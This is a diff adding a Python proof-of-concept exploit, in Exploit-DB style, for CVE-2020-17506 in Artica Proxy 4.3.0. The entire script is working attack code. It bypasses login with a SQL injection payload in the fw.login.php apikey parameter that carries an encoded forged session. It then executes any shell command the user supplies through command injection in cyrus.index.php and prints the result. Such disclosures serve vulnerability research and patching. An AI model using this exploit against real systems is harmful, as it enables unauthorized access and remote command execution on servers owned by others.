@@ -1,0 +1,52 @@
+# Exploit Title: Artica Proxy 4.3.0 - Authentication Bypass
+# Google Dork: N/A
+# Date: 2020-08-13
+# Exploit Author: Dan Duffy
+# Vendor Homepage: http://articatech.net/
+# Software Link: http://articatech.net/download2x.php?IsoOnly=yes
+# Version: 4.30.00000000 (REQUIRED)
+# Tested on: Debian
+# CVE : CVE-2020-17506
+
+import requests
+import argparse
+from bs4 import BeautifulSoup
+
+
+def bypass_auth(session, args):
+    login_endpoint = "/fw.login.php?apikey="
+    payload = "%27UNION%20select%201,%27YToyOntzOjM6InVpZCI7czo0OiItMTAwIjtzOjIyOiJBQ1RJVkVfRElSRUNUT1JZX0lOREVYIjtzOjE6IjEiO30=%27;"
+
+    print("[+] Bypassing authentication...")
+    session.get(args.host + login_endpoint + payload, verify=False)
+
+    return session
+
+
+def run_command(session, args):
+    cmd_endpoint = "/cyrus.index.php?service-cmds-peform=||{}||".format(args.command)
+    print("[+] Running command: {}".format(args.command))
+    response = session.post(args.host + cmd_endpoint, verify=False)
+    soup = BeautifulSoup(response.text, "html.parser")
+    print(soup.find_all("code")[1].get_text())
+
+
+def main():
+    parser = argparse.ArgumentParser(description="CVE-2020-17506 Artica PoC.")
+    parser.add_argument(
+        "--host", help="The host to target. Format example: https://host:port",
+    )
+    parser.add_argument("--command", help="The command to run")
+
+    args = parser.parse_args()
+    if not args.host or not args.command:
+        parser.print_help()
+        exit(0)
+    session = requests.Session()
+    session = bypass_auth(session, args)
+
+    run_command(session, args)
+
+
+if __name__ == "__main__":
+    main()
